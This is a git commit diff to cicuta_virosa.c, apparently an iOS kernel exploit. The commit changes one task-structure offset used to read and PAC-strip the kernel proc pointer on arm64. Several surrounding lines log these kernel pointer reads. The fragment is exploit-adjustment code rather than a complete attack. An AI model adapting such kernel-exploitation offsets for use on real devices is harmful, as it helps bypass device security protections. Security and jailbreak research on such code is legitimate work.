b48f700358a71a86780ca5d3b2360c219a75d8d6
woodfairy <66573402+woodfairy@users.noreply.github.com>
2021-02-12 18:15:15 +0100

    change offset for arm64

--- cicuta_virosa.c
+++ cicuta_virosa.c
@@ -376,7 +376,7 @@ stage1:
     cicuta_log("task PAC: 0x%llx", task_pac);
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
-    uint64_t proc_pac = read_64(task + 0x3A0);
+    uint64_t proc_pac = read_64(task + 0x390);
     cicuta_log("proc PAC: 0x%llx", proc_pac);
     uint64_t proc = proc_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
